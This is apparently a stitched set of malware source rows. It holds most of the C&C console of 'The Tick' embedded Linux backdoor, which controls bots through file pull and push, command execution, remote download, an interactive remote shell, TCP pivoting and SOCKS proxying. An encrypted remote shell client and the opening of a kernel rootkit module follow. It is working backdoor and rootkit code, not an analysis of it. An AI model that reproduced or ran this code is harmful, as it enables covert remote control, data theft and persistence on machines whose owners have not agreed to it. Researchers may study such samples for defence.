        except Exception:
            sock.sendall(pack(""!BBBBIH"", 5, 5, 0, atyp, 0, 0))
            raise

        try:

            # Tell the client the connection was successful.
            sock.sendall(pack(""!BBBB"", 5, 0, 0, 1) + inet_aton(addr) + pack(""!H"", port))

            # Launch the TCP forwarders now.
            bouncer_1 = TCPForward(sock, bot_sock)
            bouncer_2 = TCPForward(bot_sock, sock)
            bouncer_1.start()
            bouncer_2.start()
            self.bouncers.append(bouncer_1)
            self.bouncers.append(bouncer_2)

        # Clean up the pivoted connection on exception.
        except Exception:
            try:
                bot_sock.shutdown(2)
            except Exception:
                pass
            try:
                bot_sock.close()
            except Exception:
                pass
            raise

    # Forcefully kill the background thread.
    # The accept() call is a bit particular in Python,
    # we can't just close the socket and call it a day.
    # This resulted in stubborn listener threads who simply
    # refused to die... extreme measures had to be taken. ;)
    def kill(self):

        # Trivial case.
        if not self.alive:
            return

        # Set the flag to false so the thread
        # knows we are asking it to quit.
        self.alive = False

        try:

            # Connect briefly to the listnening port.
            # This will ""wake up"" the thread stuck
            # in the blocking socket accept() call.
            s = socket()
            try:
                s.connect((""127.0.0.1"", self.port))
            finally:
                s.close()

        finally:

            # Kill all the TCP forwarders too.
            while self.bouncers:
                bouncer = self.bouncers.pop()
                try:
                    bouncer.kill()
                except Exception:
                    print_exc()     # XXX DEBUG
                    pass

##############################################################################
# The Tick console. This is the one that launches everything else.

# Based on the standard cmd module, but with various hacks inside.
# And with pretty colors! Colorrrrrrssssssssssssssssssss!
class Console(Cmd):
    ""Interactive text console to manage The Tick bots.""

    # Header for help page.
    doc_header = 'Available commands (type help * or help <command>)'

    def __init__(self, args = ()):

        # This member will contain the currently selected bot.
        self.current = None

        # This is a set of previously seen bot UUIDs.
        # We use this to avoid notifying the user for bot reconnections,
        # since we only want to show new bots connecting to the C&C.
        # Reconnections may happen sporadically and just clutter the screen.
        self.known_bots = set()

        # These are the currently running SOCKS proxies.
        # Keys are port numbers, values are SOCKSProxy objects.
        # See the do_proxy() method for more details.
        self.proxies = {}

        # The TCP port listener for bots will be here.
        self.listener = None

        # This is the list of queued notifications.
        # Notifications come from a background thread and when possible
        # they are shown in real time, but when not they are queued here.
        self.notifications = []

        # This flag is related to the notifications.
        # We'll use it to know whether it's safe to print them directly
        # or we should wait until a better time to do it. Specifically,
        # we will only print notifications in real time if the main thread
        # is blocked waiting for user input, and queue them in any other case.
        self.inside_prompt = False

        # All the supported command line switches go here.
        parser = ArgumentParser(formatter_class=ColorHelpFormatter,
                prog=Fore.GREEN+Style.BRIGHT+os.path.basename(sys.argv[0])+Style.RESET_ALL,
                description=""Embedded Linux Backdoor by Mario Vilas (NCC Group)"")
        parser.add_argument(""--version"", action=""version"",
                version=""The Tick, by Mario Vilas (NCC Group), version "" + Fore.YELLOW + ""0.1"" + Style.RESET_ALL)
        parser.add_argument(""-b"", ""--bind"", dest=""bind_addr"", default=""0.0.0.0"",
                metavar=Fore.BLUE+Style.BRIGHT+""ADDRESS""+Style.RESET_ALL,
                help=""IP address to bind all the listeners to [default: ""+Fore.YELLOW+""0.0.0.0""+Style.RESET_ALL+""]"")
        parser.add_argument(""-p"", ""--port"", type=int, default=5555,
                metavar=Fore.BLUE+Style.BRIGHT+""PORT""+Style.RESET_ALL,
                help=""Port to bind the TCP listener to [default: ""+Fore.YELLOW+""5555""+Style.RESET_ALL+""]"")
        parser.add_argument(""--no-color"", action=""store_true"", default=False,
                help=(""Disable the use of ANSI escape sequences (i.e. pretty ""+
                Fore.RED+""c""+Style.BRIGHT+""o""+Fore.YELLOW+""l""+Fore.GREEN+""o""+Fore.BLUE+""r""+Fore.MAGENTA+""s""+Style.RESET_ALL+
                "" and other niceties)""))
        parser.add_argument(""--pro"", action=""store_true"", default=False,
                help=""Replace the 0ldsch00l bloody banner with a cleaner, more sober banner,""\
                "" one more suitable for a pentesting report from an infosec professional""\
                "" such as yourself. Yes, this is who you are now. Accept it."")

        # Try to adjust the help text to the console size.
        # On error just ignore it and go with the default.
        try:
            width = int(check_output('stty size 2>/dev/null', shell=True).split(' ')[1])
            if width > 160: width = 140
            elif width < 80: width = 80
            os.environ[""COLUMNS""] = str(width)
        except Exception:
            pass

        # Parse the command line arguments.
        self.args = parser.parse_args(args)

        # Show either the fun or the boring banner.
        self.use_boring_banner = self.args.pro

        # Call the parent class constructor.
        Cmd.__init__(self)

    # Context manager to ensure proper cleanup.
    # Launching the daemons is done here to ensure it's mandatory.
    def __enter__(self):

        # Fire up the TCP C&C listener.
        self.listener = Listener(self.notify_new_bot, self.args.bind_addr, self.args.port)
        self.listener.start()

        # Comply with the context managers protocol.
        return self

    # Context manager to ensure proper cleanup.
    # This will kill all the background daemons.
    def __exit__(self, *args):
        try:
            for proxy in self.proxies.values():
                try:
                    proxy.kill()
                except Exception:
                    print_exc()
        except Exception:
            print_exc()
        try:
            self.listener.kill()
        except Exception:
            print_exc()

    # This method is called by the listener whenever a new bot connects.
    # It will show a message to the user right below the command prompt.
    # Note that this method will be invoked from a background thread.
    def notify_new_bot(self, listener, bot):

        # Notifications for reconnecting bots are skipped because they're
        # not very useful except for debugging.
        if bot.uuid not in self.known_bots:

            # Prepare the notification text.
            index = listener.bots.keys().index(bot.uuid)
            text = ""Bot %d [%s] connected from %s"" % (index, bot.uuid, bot.from_addr[0])
            text = Fore.BLUE + Style.BRIGHT + text + Style.RESET_ALL

            # If the main thread is blocked waiting at the prompt,
            # do some ANSI escape codes magic to insert the notification text on screen.
            # Note that we cannot use this trick if --no-color was specified.
            # (I mean, we could, but what if the reason the colors were turned off
            # was that the C&C was not being run in a console with a proper tty?)
            if self.inside_prompt and ANSI_ENABLED:
                buf_bkp = readline.get_line_buffer()
                sys.stdout.write(""\033[s\033[0G\033[2K"" + text + ""\n"")
                sys.stdout.write(self.prompt.replace(""\x01"", """").replace(""\x02"", """") + buf_bkp + ""\033[u\033[1B"")
                readline.redisplay()

            # If we are not blocked at the prompt, better not write now!
            # We would be messing up the output of some command.
            # We'll queue the notification instead to be shown later.
            else:
                self.notifications.append(text)

            # Remember we've seen this bot so we don't notify again.
            self.known_bots.add(bot.uuid)

    # Hook the precmd event to know when we're out of the command prompt.
    def precmd(self, line):
        try:

            if self.current is not None and (not self.current.alive or self.is_bot_busy()):
                self.current = None"
tick-2,"# Set the flag to indicate we're NOT blocked at the prompt.
            self.inside_prompt = False

        # Catch all exceptions, show the traceback and continue.
        except Exception:
            print_exc()

        # Don't forget to return this or we can't run commands!
        return line

    # Hook the precmd event to know when we're in the command prompt.
    # This is also a good time to issue the queued notifications.
    def postcmd(self, stop, line):
        try:

            # If the currently selected bot is not alive, deselect it automatically.
            # This may happen for example if the bot dies after executing a command,
            # the connection is dropped unexpectedly, or the command was one of those
            # that reuse the C&C socket to do something else.
            if self.current is not None and (not self.current.alive or self.is_bot_busy()):
                self.current = None

            # If we have queued notifications, show them now.
            while self.notifications:
                print(self.notifications.pop(0))

            # Set the flag to indicate we're blocked at the prompt.
            self.inside_prompt = True

        # Catch all exceptions, show the traceback and continue.
        except Exception:
            print_exc()

        # Don't forget to return this or we can't quit!
        return stop

    # Hook the preloop event because otherwise we don't
    # find out when the prompt is shown for the first time.
    def preloop(self):
        try:

            # If the currently selected bot is not alive, deselect it automatically.
            # This may happen for example if the bot dies after executing a command,
            # the connection is dropped unexpectedly, or the command was one of those
            # that reuse the C&C socket to do something else.
            if self.current is not None and (not self.current.alive or self.is_bot_busy()):
                self.current = None

            # Set the flag to indicate we're blocked at the prompt.
            self.inside_prompt = True

        # Catch all exceptions, show the traceback and continue.
        except Exception:
            print_exc()

    # Default behaviour for the base class is to repeat the last command if
    # a blank line is given. This is quite dangerous so we're disabling it.
    def emptyline(self):
        return """"

    # This property generates the banner.
    @property
    def intro(self):

        # Prepare the dynamic part of the banner.
        listening_on = (""Listening on: %s:%d"" % (self.listener.bind_addr, self.listener.port))

        # Boring banner :(
        if self.use_boring_banner:
            return (
                BORING_BANNER +
                "" Embedded Linux Backdoor\nby Mario Vilas (NCC Group)\n\n"" +
                Fore.GREEN + listening_on + Style.RESET_ALL
            )

        # Fun banner :)
        return (
            FUN_BANNER +
            Style.BRIGHT +
            ""                Embedded Linux Backdoor\n"" + Style.NORMAL +
            ""               by Mario Vilas (NCC Group)\n\n"" +
            Fore.GREEN + listening_on + Style.RESET_ALL
        )

    # This property generates the command prompt.
    @property
    def prompt(self):

        # If the currently selected bot is not alive, deselect it automatically.
        # This may happen for example if the bot dies after executing a command,
        # the connection is dropped unexpectedly, or the command was one of those
        # that reuse the C&C socket to do something else.
        if self.current is not None and (not self.current.alive or self.is_bot_busy()):
            self.current = None

        # If no bot is selected, show the corresponding prompt.
        if self.current is None:
            return ""\x01"" + Fore.RED + ""\x02"" + ""[No bot selected] "" + ""\x01"" + Style.RESET_ALL + ""\x02""

        # If a bot is selected, show its info in the prompt.
        bot = self.current
        index = self.listener.bots.keys().index(bot.uuid)
        addr = bot.from_addr[0]
        return ""\x01"" + Fore.GREEN + Style.BRIGHT + ""\x02"" + (""[Bot %d: %s] "" % (index, addr)) + ""\x01"" + Style.RESET_ALL + ""\x02""

    # Helper function to tell if a bot is busy.
    # If no bot is given, the currently selected bot is tested.
    def is_bot_busy(self, bot = None):
        if bot is None:
            bot = self.current
            if bot is None:
                return False
        uuid = bot.uuid
        for x in self.proxies.values():
            if x.uuid == uuid:
                return True
        return False

    #
    # The implementation for each command follows.
    #

    def do_help(self, line):
        """"""
    \x1b[32m\x1b[1mhelp\x1b[0m
    \x1b[32m\x1b[1mhelp\x1b[0m \x1b[34m\x1b[1m*\x1b[0m
    \x1b[32m\x1b[1mhelp\x1b[0m <\x1b[34m\x1b[1mcommand\x1b[0m> [\x1b[34m\x1b[1mcommand\x1b[0m...]

    Without arguments, shows the list of available commands.
    With arguments, shows the help for one or more commands.
    Use ""\x1b[34m\x1b[1mhelp *\x1b[0m"" to show help for all commands at once.
    The question mark ""\x1b[34m\x1b[1m?\x1b[0m"" can be used as an alias for ""\x1b[34m\x1b[1mhelp\x1b[0m"".\n""""""
        if not line.strip():
            Cmd.do_help(self, line)
        else:
            commands = split(line, comments=True)
            if commands == [""*""]:
                commands = self.get_names()
                commands = [ x[3:] for x in commands if x.startswith(""do_"") ]
                commands.sort()
            last = len(commands) - 1
            index = 0
            for cmd in commands:
                Cmd.do_help(self, cmd)
                if index < last:
                    print(Fore.RED + Style.BRIGHT + (""-"" * 79) + Style.RESET_ALL)
                index += 1

    def do_exit(self, line):
        """"""
    \x1b[32m\x1b[1mexit\x1b[0m

    Exit the command interpreter.
    This command takes no arguments.\n""""""

        # Parse the arguments, on error show help.
        if line.strip():
            self.onecmd(""help exit"")
            return

        # Quit the command intepreter.
        # The context manager will take care of cleaning up.
        return True

    def do_clear(self, line):
        """"""
    \x1b[32m\x1b[1mclear\x1b[0m

    Clear the screen.
    This command takes no arguments.\n""""""

        # Parse the arguments, on error show help.
        if line.strip():
            self.onecmd(""help clear"")
            return

        # Clear the screen using the magic of ANSI escape codes.
        # We need to make sure the escape codes are not being filtered out.
        if not ANSI_ENABLED:
            deinit()
            init()
        print(""\033[2J\033[1;1f"")
        if not ANSI_ENABLED:
            deinit()
            init(wrap = True, strip = True)

    def do_bots(self, line):
        """"""
    \x1b[32m\x1b[1mbots\x1b[0m

    List all currently connected bots.
    This command takes no arguments.\n""""""

        # Parse the arguments, on error show help.
        if line.strip():
            self.onecmd(""help bots"")
            return

        # If we have no connected bots, just show an error message.
        if not self.listener.bots:
            print(Fore.YELLOW + ""No bots have connected yet"" + Style.RESET_ALL)
            return

        # We will show the list of bots in an ASCII art table.
        # Because of course we will. ;)
        # Note that we can't use ANSI escapes here because the
        # size calculations for the table go wrong, so we do a
        # dirty trick instead with placeholder characters.
        table = Texttable()
        table.set_deco(Texttable.HEADER)
        table.set_cols_dtype((""i"", ""t"", ""t"", ""t""))
        table.set_cols_align((""l"", ""c"", ""c"", ""c""))
        table.set_cols_valign((""t"", ""t"", ""t"", ""t""))
        table.set_cols_width((len(str(len(self.listener.bots))), 38, 17, 6))
        table.add_rows(((""#"", ""UUID"", ""IP address"", ""Status""),), header = True)
        i = 0
        for bot in self.listener.bots.values():
            busy = self.is_bot_busy(bot)
            status = ""\x01gone\x04""
            if bot.alive:
                status = ""\x03live\x04""
            if busy:
                status = ""\x02busy\x04""
            table.add_row((
                i,
                bot.uuid,
                ""\x02"" + bot.from_addr[0] + ""\x04"",
                status
            ))
            i += 1
        text = table.draw()
        text = text.replace(""\x01"", "" "" + Fore.RED + Style.BRIGHT)
        text = text.replace(""\x02"", "" "" + Fore.BLUE + Style.BRIGHT)
        text = text.replace(""\x03"", "" "" + Fore.GREEN + Style.BRIGHT)
        text = text.replace(""\x04"", Style.RESET_ALL + "" "")
        print()
        print(text)
        print()

    def do_current(self, line):
        """"""
    \x1b[32m\x1b[1mcurrent\x1b[0m

    Shows the currently selected bot.
    This command takes no arguments.\n""""""

        # Parse the arguments, on error show help.
        if line.strip():
            self.onecmd(""help current"")
            return

        # If no bot is selected, show a simple message.
        if self.current is None:
            print(Fore.YELLOW + ""No bot selected"" + Style.RESET_ALL)
            return

        # Show the details of the currently selected bot.
        bot = self.current
        addr = bot.from_addr[0]
        uuid = bot.uuid
        index = self.listener.bots.keys().index(uuid)
        print((
            ""\n"" +
            ""Bot number: #%d\n"" +
            ""IP address: %s\n"" +
            ""UUID: ["" + Fore.BLUE + Style.BRIGHT + ""%s"" + Style.RESET_ALL + ""]\n""
        ) % (index, addr, uuid))

    def do_use(self, line):
        """"""
    \x1b[32m\x1b[1muse\x1b[0m <\x1b[34m\x1b[1mIP address\x1b[0m>
    \x1b[32m\x1b[1muse\x1b[0m <\x1b[34m\x1b[1mnumber\x1b[0m>
    \x1b[32m\x1b[1muse\x1b[0m <\x1b[34m\x1b[1mUUID\x1b[0m>
    \x1b[32m\x1b[1muse\x1b[0m

    Select a bot to use. Try the ""\x1b[32m\x1b[1mbots\x1b[0m"" command to list the available bots.
    When invoked with no arguments, the currently selected bot is deselected.\n""""""

        # When invoked with no arguments, deselect the current bot.
        line = line.strip()
        if not line:
            self.current = None
        else:

            try:
                bot_id, = split(line, comments=True)
            except Exception:
                self.onecmd(""help use"")
                return

            try:
                bot = self.listener.bots[bot_id]
            except KeyError:
                try:
                    bot = self.listener.bots.values()[ int(bot_id) ]
                except IndexError:
                    print(Fore.YELLOW + (""Error: no bot number %d found"" % int(bot_id)) + Style.RESET_ALL)
                    return
                except ValueError:

                    try:
                        inet_aton(bot_id)
                    except error:
                        self.onecmd(""help use"")     # wasn't an IP either :(
                        return
                    found = False
                    index = 0
                    for bot in self.listener.bots.values():
                        if bot.alive and bot_id == bot.from_addr[0]:
                            found = True
                            break
                        index = index + 1
                    if not found:
                        print(Fore.YELLOW + (""Error: no bot connected to IP address %s"" % bot_id) + Style.RESET_ALL)
                        return

            if self.is_bot_busy(bot):
                print(Fore.YELLOW + ""Bot is busy"" + Style.RESET_ALL)
                return

            if not bot.alive:
                print(Fore.YELLOW + ""Bot is disconnected"" + Style.RESET_ALL)
                return

            self.current = bot

    def do_pull(self, line):
        """"""
    \x1b[32m\x1b[1mpull\x1b[0m <\x1b[34m\x1b[1mremote file\x1b[0m> <\x1b[34m\x1b[1mlocal file\x1b[0m>

    Pull a file from the target machine.\n""""""

        if self.current is None:
            print(Fore.YELLOW + ""Error: no bot selected"" + Style.RESET_ALL)
            return

        if self.is_bot_busy():
            print(Fore.YELLOW + ""Bot is busy"" + Style.RESET_ALL)
            return

        try:
            remote_file, local_file = split(line, comments=True)
        except Exception:
            self.onecmd(""help pull"")
            return

        self.current.file_read(remote_file, local_file)

    def do_push(self, line):
        """"""
    \x1b[32m\x1b[1mpush\x1b[0m <\x1b[34m\x1b[1mlocal file\x1b[0m> <\x1b[34m\x1b[1mremote file\x1b[0m>

    Push a file into the target machine.\n""""""

        if self.current is None:
            print(Fore.YELLOW + ""Error: no bot selected"" + Style.RESET_ALL)
            return

        if self.is_bot_busy():
            print(Fore.YELLOW + ""Bot is busy"" + Style.RESET_ALL)
            return

        try:
            local_file, remote_file = split(line, comments=True)
        except Exception:
            self.onecmd(""help push"")
            return

        self.current.file_write(local_file, remote_file)

    def do_chmod(self, line):
        """"""
    \x1b[32m\x1b[1mchmod\x1b[0m <\x1b[34m\x1b[1mremote file\x1b[0m>

    Change a file's access mode flags.\n""""""

        if self.current is None:
            print(Fore.YELLOW + ""Error: no bot selected"" + Style.RESET_ALL)
            return

        if self.is_bot_busy():
            print(Fore.YELLOW + ""Bot is busy"" + Style.RESET_ALL)
            return

        try:
            remote_file, mode_flags = split(line, comments=True)
        except Exception:
            self.onecmd(""help chmod"")
            return

        self.current.file_chmod(remote_file, int(mode_flags, 8))

    def do_rm(self, line):
        """"""
    \x1b[32m\x1b[1mrm\x1b[0m <\x1b[34m\x1b[1mremote file\x1b[0m>

    Delete a file.\n""""""

        if self.current is None:
            print(Fore.YELLOW + ""Error: no bot selected"" + Style.RESET_ALL)
            return

        if self.is_bot_busy():
            print(Fore.YELLOW + ""Bot is busy"" + Style.RESET_ALL)
            return

        try:
            remote_file, = split(line, comments=True)
        except Exception:
            self.onecmd(""help rm"")
            return

        self.current.file_delete(remote_file)

    def do_exec(self, line):
        """"""
    \x1b[32m\x1b[1mexec\x1b[0m <\x1b[34m\x1b[1mcommand line\x1b[0m>

    Execute a non interactive command.
    The output of the command is limited to 1024 bytes.\n""""""

        if self.current is None:
            print(Fore.YELLOW + ""Error: no bot selected"" + Style.RESET_ALL)
            return

        if self.is_bot_busy():
            print(Fore.YELLOW + ""Bot is busy"" + Style.RESET_ALL)
            return

        output = self.current.file_exec(line)

        if len(output) == 1023:
            output += ""\n"" + Fore.RED + Style.BRIGHT + ""<output truncated>"" + Style.RESET_ALL

        print(output)

    def do_download(self, line):
        """"""
    \x1b[32m\x1b[1mdownload\x1b[0m <\x1b[34m\x1b[1murl\x1b[0m> <\x1b[34m\x1b[1mremote file\x1b[0m>

    Download a file via HTTP into the target machine.
    Use the ""\x1b[32m\x1b[1mpull\x1b[0m"" command to retrieve the file locally afterwards.\n""""""

        if self.current is None:
            print(Fore.YELLOW + ""Error: no bot selected"" + Style.RESET_ALL)
            return

        if self.is_bot_busy():
            print(Fore.YELLOW + ""Bot is busy"" + Style.RESET_ALL)
            return

        try:
            url, remote_file = split(line, comments=True)
        except Exception:
            self.onecmd(""help download"")
            return

        self.current.http_download(url, remote_file)

    def do_fork(self, line):
        """"""
    \x1b[32m\x1b[1mfork\x1b[0m

    Fork the bot instance.
    This will create a new bot instance that will connect automatically.
    The new instance will have a new UUID.
    This command takes no arguments.\n""""""

        if self.current is None:
            print(Fore.YELLOW + ""Error: no bot selected"" + Style.RESET_ALL)
            return

        if self.is_bot_busy():
            print(Fore.YELLOW + ""Bot is busy"" + Style.RESET_ALL)
            return

        try:
            assert not split(line, comments=True)
        except Exception:
            self.onecmd(""help fork"")
            return

        self.current.system_fork()

    def do_shell(self, line):
        """"""
    \x1b[32m\x1b[1mshell\x1b[0m

    Launch an interactive shell over the C&C connection.
    This command takes no arguments.\n""""""

        if self.current is None:
            print(Fore.YELLOW + ""Error: no bot selected"" + Style.RESET_ALL)
            return

        if self.is_bot_busy():
            print(Fore.YELLOW + ""Bot is busy"" + Style.RESET_ALL)
            return

        try:
            assert not split(line, comments=True)
        except Exception:
            self.onecmd(""help shell"")
            return

        uuid = self.current.uuid

        sock = self.current.system_shell()
        sleep(0.1)      
        print(Fore.YELLOW + ""/-------------------------------------------------\\"" + Style.RESET_ALL)
        print(Fore.YELLOW + ""| Entering remote shell. Use "" + Style.BRIGHT + ""Control+C"" + Style.NORMAL + "" to return. |"" + Style.RESET_ALL)
        print(Fore.YELLOW + ""\\-------------------------------------------------/"" + Style.RESET_ALL)
        shell = RemoteShell(sock)
        shell.run_parent()
        print()

        self.current = self.listener.bots.get(uuid, None)

    def do_dig(self, line):
        """"""
    \x1b[32m\x1b[1mdig\x1b[0m <\x1b[34m\x1b[1mdomain name\x1b[0m>

    Resolve a domain name at the bot.
    This is useful for resolving local domains at the target network.\n""""""

        # A bot must be selected.
        if self.current is None:
            print(Fore.YELLOW + ""Error: no bot selected"" + Style.RESET_ALL)
            return

        if self.is_bot_busy():
            print(Fore.YELLOW + ""Bot is busy"" + Style.RESET_ALL)
            return

        try:
            domain, = split(line, comments=True)
            assert domain
        except Exception:
            self.onecmd(""help dig"")
            return

        answer = self.current.dns_resolve(domain)

        for addr in answer:
            print(addr)

    def do_pivot(self, line):
        """"""
    \x1b[32m\x1b[1mpivot\x1b[0m <\x1b[34m\x1b[1mlisten on port\x1b[0m> <\x1b[34m\x1b[1mconnect to IP address\x1b[0m> <\x1b[34m\x1b[1mconnect to port\x1b[0m>

    Create a one shot TCP tunnel. Useful for pivoting when launching exploits.
    This tunnel will only be available to localhost and the port is closed
    once a client has connected.\n""""""

        if self.current is None:
            print(Fore.YELLOW + ""Error: no bot selected"" + Style.RESET_ALL)
            return

        if self.is_bot_busy():
            print(Fore.YELLOW + ""Bot is busy"" + Style.RESET_ALL)
            return

        assert self.current.alive

        try:
            listen, address, port = split(line, comments=True)
        except Exception:
            self.onecmd(""help pivot"")
            return

        uuid = self.current.uuid

        listen  = int(listen)
        port    = int(port)
        address = gethostbyname(address)
        listen_sock = socket()
        listen_sock.bind( (""127.0.0.1"", listen) )
        listen_sock.listen(1)
        print(""Connect to port %d now..."" % listen)
        accept_sock = listen_sock.accept()[0]
        try:

            listen_sock.shutdown(2)
            listen_sock.close()

            connect_sock = self.current.tcp_pivot(address, port)
            try:
                try:

                    bouncer_1 = TCPForward(connect_sock, accept_sock)
                    bouncer_2 = TCPForward(accept_sock, connect_sock)
                    bouncer_1.start()
                    bouncer_2.start()

                    self.current.bouncers = (bouncer_1, bouncer_2)

                finally:
                    sleep(0.1)
                    self.current = self.listener.bots.get(uuid, None)

            except:
                try:
                    connect_sock.shutdown(2)
                except:
                    pass
                try:
                    connect_sock.close()
                except:
                    pass
                raise
        except:
            try:
                accept_sock.shutdown(2)
            except:
                pass
            try:
                accept_sock.close()
            except:
                pass
            raise

    def do_proxy(self, line):
        """"""
    \x1b[32m\x1b[1mproxy\x1b[0m [\x1b[33m\x1b[1mls\x1b[0m]
    \x1b[32m\x1b[1mproxy\x1b[0m [\x1b[33m\x1b[1madd\x1b[0m] <\x1b[34m\x1b[1mport\x1b[0m> [\x1b[34m\x1b[1mbind address\x1b[0m] [\x1b[34m\x1b[1musername\x1b[0m] [\x1b[34m\x1b[1mpassword\x1b[0m]
    \x1b[32m\x1b[1mproxy\x1b[0m \x1b[33m\x1b[1mrm\x1b[0m <\x1b[34m\x1b[1mport\x1b[0m>

    Opens a SOCKS proxy on the given local port.
    Proxied connections will come out from the bot.

    Subcommands are:
        \x1b[33m\x1b[1mls\x1b[0m      Lists the currently active proxies
        \x1b[33m\x1b[1madd\x1b[0m     Adds a new proxy
        \x1b[33m\x1b[1mrm\x1b[0m      Removes an active proxy

    Arguments are:
        \x1b[33m\x1b[1mbind address\x1b[0m  Address to bind to (default: \x1b[34m\x1b[1m127.0.0.1\x1b[0m)
        \x1b[33m\x1b[1mport\x1b[0m          Port to listen on, also identifies the proxy
        \x1b[33m\x1b[1musername\x1b[0m      Optional username (if set, password must set too)
        \x1b[33m\x1b[1mpassword\x1b[0m      Optional password\n""""""

        valid_commands = {
            ""a"": ""add"",
            ""r"": ""rm"",
            ""l"": ""ls"",
        }

        try:
            args = list(split(line, comments=True))

            if not args:
                command = ""ls""
                port = None
            else:

                try:
                    int(args[0])
                    args.insert(0, ""add"")
                except ValueError:
                    pass

                command = args.pop(0)
                command = valid_commands.get(command, command)
                assert command in valid_commands.values()

                if command == ""add"":
                    port = int(args.pop(0))
                    assert 0 < port < 65536
                    if args:
                        bind_addr = args.pop(0)
                        bind_addr = inet_ntoa(inet_aton(bind_addr))
                        if args:
                            username = args.pop(0)
                            password = args.pop(0)  
                            assert not args
                        else:
                            username = """"
                            password = """"
                    else:
                        bind_addr = ""127.0.0.1""
                        username = """"
                        password = """"
                        
                elif command == ""rm"":
                    port = int(args.pop(0))
                    assert 0 < port < 65536
                    assert not args

                elif command == ""ls"":
                    assert not args
                else:
                    raise AssertionError()

        except Exception:
            #print_exc()     # XXX DEBUG
            self.onecmd(""help proxy"")
            return

        if command == ""add"":

            if self.current is None:
                print(Fore.YELLOW + ""Error: no bot selected"" + Style.RESET_ALL)
                return
            
            if self.is_bot_busy():
                print(Fore.YELLOW + ""Bot is busy"" + Style.RESET_ALL)
                return

            if port in self.proxies:
                print(Fore.YELLOW + ""Error: port is already in use"" + Style.RESET_ALL)
                return
            
            uuid = self.current.system_fork()

            proxy = SOCKSProxy(self.listener, self.current.uuid, bind_addr, port, username, password)

            self.proxies[port] = proxy

            proxy.start()

            sleep(0.1)
            self.current = self.listener.bots.get(uuid, None)

        elif command == ""rm"":

            if port not in self.proxies:
                print(Fore.YELLOW + (""No proxy on port %d"" % port) + Style.RESET_ALL)
                return

            self.proxies.pop(port).kill()

        elif command == ""ls"":

            if not self.proxies:
                print(Fore.YELLOW + ""No active proxies right now"" + Style.RESET_ALL)
                print(""(Use 'help proxy' to show the help)"")
                return

            table = Texttable()
            table.set_deco(Texttable.HEADER)
            table.set_cols_dtype((""i"", ""t"", ""t"", ""t"", ""t"", ""t""))
            table.set_cols_align((""l"", ""c"", ""c"", ""c"", ""c"", ""c""))
            table.set_cols_valign((""t"", ""t"", ""t"", ""t"", ""t"", ""t""))
            table.set_cols_width((len(str(len(self.proxies))), 36, 15+2, 5+2, 15+1, 4+2))
            table.add_rows(((""#"", ""UUID"", ""Outgoing IP"", ""Port"", ""Bind IP"", ""Auth""),), header = True)
            i = 0
            for port, proxy in self.proxies.items():
                i += 1
                uuid = proxy.uuid
                bot = self.listener.bots[uuid]
                index = self.listener.bots.keys().index(uuid)
                table.add_row((
                    index,
                    uuid,
                    ""\x02"" + bot.from_addr[0] + ""\x04"",
                    (""\x03"" if proxy.alive else ""\x01"") + str(port) + ""\x04"",
                    ""\x04"" + proxy.bind_addr,
                    (""\x03yes\x04"" if proxy.username and proxy.password else ""\x01no\x04""),
                ))
            text = table.draw()
            text = text.replace(""\x01"", "" "" + Fore.RED + Style.BRIGHT)
            text = text.replace(""\x02"", "" "" + Fore.BLUE + Style.BRIGHT)
            text = text.replace(""\x03"", "" "" + Fore.GREEN + Style.BRIGHT)
            text = text.replace(""\x04"", Style.RESET_ALL + "" "")
            print()
            print(text)
            print()

        else:
            raise AssertionError()

    def do_kill(self, line):
        """"""
    \x1b[32m\x1b[1mkill\x1b[0m

    Kill the currently selected bot.
    This command takes no arguments.\n""""""

        if self.current is None:
            print(Fore.YELLOW + ""Error: no bot selected"" + Style.RESET_ALL)
            return

        if self.is_bot_busy():
            print(Fore.YELLOW + ""Bot is busy"" + Style.RESET_ALL)
            return

        try:
            assert not split(line, comments=True)
        except Exception:
            raise
            self.onecmd(""help kill"")
            return

        self.current.system_exit()

        self.current = None
        
    if ""play"" in globals():
        darknet = ""tor""
        filename = ""malna.png""
        bitcoins = 13
        secret = """".join([x[1:].encode(darknet[::-1]+str(bitcoins)) for x in os.path.splitext(filename)])
        del darknet
        del filename
        del bitcoins
        def get_names(self):
            secret = ""do_"" + Console.secret
            names = Cmd.get_names(self)
            if secret in names:
                names.remove(secret)
            return names

def main(args = None):

    if args is None:
        args = sys.argv[1:]

    with Console(args) as c:

        skip_intro = False

        while True:
            try:

                # Run the command loop, showing the banner only once.
                if skip_intro:
                    c.cmdloop(intro = """")
                else:
                    c.cmdloop()

                # If we got here that means the exit command was used.
                break

            # Show bot errors in a pretty way.
            except BotError as e:
                print(Fore.RED + Style.BRIGHT + str(e) + Style.RESET_ALL)

            # Quit silently with Control+C.
            except KeyboardInterrupt:
                print()
                break

            # Show all other exceptions as Python tracebacks.
            # Ugly, but easier to debug. You'll thank me.
            except Exception:
                print_exc()

            # If we got here this is not the first time so skip the banner.
            skip_intro = True

if __name__ == ""__main__"":
    main()      # colorama already initialized when imported
    deinit()    # cleanup colorama"
backdoor_src_client,"from Crypto.Cipher import AES
from Crypto import Random
import socket
import base64
import os
import optparse
import sys

# encrypt/encode and decrypt/decode a string
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# random secret key (both the client and server must match this key)
secret = ""sixteen byte key""
iv = Random.new().read(AES.block_size)
cipher = AES.new(secret, AES.MODE_CFB, iv)

# parse command line argument
parser = optparse.OptionParser(""usage: python client.py -d <host ip> -p <port>"")
parser.add_option('-d', dest='host', type = 'string', help = 'target host IP')
parser.add_option('-p', dest='port', type = 'int', help = 'target port')
(options, args) = parser.parse_args()
if (options.host == None):
    print parser.usage
    sys.exit()
elif (options.port == None):
    print parser.usage
    sys.exit()
else:
    host = options.host
    port = options.port

# connect to the server host
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# main
while True:
    data = s.recv(1024)

    # decrypt data
    decrypted = DecodeAES(cipher, data)

    # check for end of file
    if decrypted.endswith(secret) == True:

        # print command
        print decrypted[:-16]

        # get command
        cmd = raw_input(""[remote shell]$ "")

        # encrypt command
        encrypted = EncodeAES(cipher, cmd)

        # send encrypted command
        s.send(encrypted)
        
        # check if user typed ""exit"" to leave remote shell
        if cmd == ""exit"":
            break
    else:
        print decrypted
s.close()
sys.exit()"
rooty v2,"#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/dirent.h>

MODULE_LICENSE(""GPL"");
int rooty_init(void);
